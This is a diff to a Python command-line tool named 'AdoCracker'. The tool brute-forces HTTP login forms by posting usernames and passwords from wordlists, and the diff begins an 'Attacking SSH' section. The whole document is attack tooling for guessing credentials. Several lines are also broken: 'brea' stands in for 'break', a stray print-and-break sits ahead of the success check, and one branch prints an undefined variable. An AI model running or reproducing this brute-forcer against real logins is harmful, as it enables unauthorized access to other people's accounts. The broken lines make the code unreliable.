@@ -1,7 +1,9 @@
+import socket
 import requests
 import sys
 from pyfiglet import figlet_format
 import argparse
+import time
 
 banner = "AdoCracker"
 print(figlet_format(banner, font="standard"))
@@ -17,6 +19,7 @@ parser.add_argument('-P', '--password_file', type=str, help="File contains passw
 parser.add_argument('-t', '--threads', type=str, help="Thread connection")
 parser.add_argument('-v', '--verbose', nargs='?', help="Enter show to see login attempts")
 parser.add_argument('-s', '--service', type=str, help="Acceptable services are http, ftp, ssh and smtp")
+parser.add_argument('--response', type=str, help="Web response after login failed attempt")
 args = parser.parse_args()
 
 if len(sys.argv) < 2:
@@ -30,11 +33,13 @@ if args.service == "http":
     username_file = args.username_file
     password = args.password
     password_file = args.password_file
+    response = args.response
 
     if "://" not in target:
         print("Target must start with http:// or https://")
         exit(0)
 
+    # When single password provided
     if args.password in sys.argv:
         file = open(username_file)
         user_list = file.readlines()
@@ -49,10 +54,19 @@ if args.service == "http":
                 print('[+]', user, '_', password)
             post = {'username': user, 'password': password, 'submit': "Submit"}
             re = requests.post(target, data=post)
-            if "Success" in re.text:
-                print("\033[1;32;40m Username found", user)
-                break
+            if "Incorrect Login Information" in re.text:  # Change this according to the server respond when login attempt failed
+                pass
+            else:
+                print("\033[1;32;40m Password found", pwd)
+                brea
+        else:
+            print("------------------------------------------------------------------"
+                  "\n Sorry No password or username found on your wordlist"
+                  "\n Please provide wordlist with more words to increase your chance"
+                  "\n----------------------------------------------------------------")
+            exit(0)
 
+    # When username file is provided
     elif args.username_file in sys.argv:
         file = open(username_file)
         file2 = open(password_file)
@@ -71,11 +85,26 @@ if args.service == "http":
                     print('[+]', user, '_', pwd)
                 post = {'username': user, 'password': pwd, 'submit': "Submit"}
                 re = requests.post(target, data=post)
-                if "Success" in re.text:
+                print(re.text)
+                break
+                if "Incorrect Login Information" in re.text:  # Change this according to the server respond when login attempt failed
+                    pass
+                else:
                     print("\033[1;32;40m Password found", pwd)
-                    break
+                    brea
+        else:
+            print("------------------------------------------------------------------"
+                  "\n Sorry No password or username found on your wordlist"
+                  "\n Please provide wordlist with more words to increase your chance"
+                  "\n----------------------------------------------------------------")
+            exit(0)
 
+    # When password file provided
     else:
+        print("------------------------------"
+              "\n     adocracker is started      "
+              "\nTake a cup of coffee and wait"
+              "\n------------------------------")
         file = open(password_file)
         pwd_list = file.readlines()
 
@@ -89,6 +118,24 @@ if args.service == "http":
                 print('[+]', username, '_', pwd)
             post = {'username': username, 'password': pwd, 'submit': "Submit"}
             re = requests.post(target, data=post)
-            if "Success" in re.text:
-                print("\033[1;32;40m Password found", pwd)
+            if "Incorrect Login Information" in re.text: # Change this according to the server respond when login attempt failed
+                pass
+            else:
+                print("\n-----------------------------------------"
+                      "\n Password found", '\033[92m'+ pwd,
+                      "\n-----------------------------------------")
                 break
+        else:
+            print("------------------------------------------------------------------"
+                  "\n Sorry No password or username found on your wordlist"
+                  "\n Please provide wordlist with more words to increase your chance"
+                  "\n----------------------------------------------------------------")
+            exit(0)
+
+# Attacking SSH
+if args.service == "ssh":
+    target = args.attack
+    username = args.login
+    username_file = args.username_file
+    password = args.password
+    password_file = args.password_file
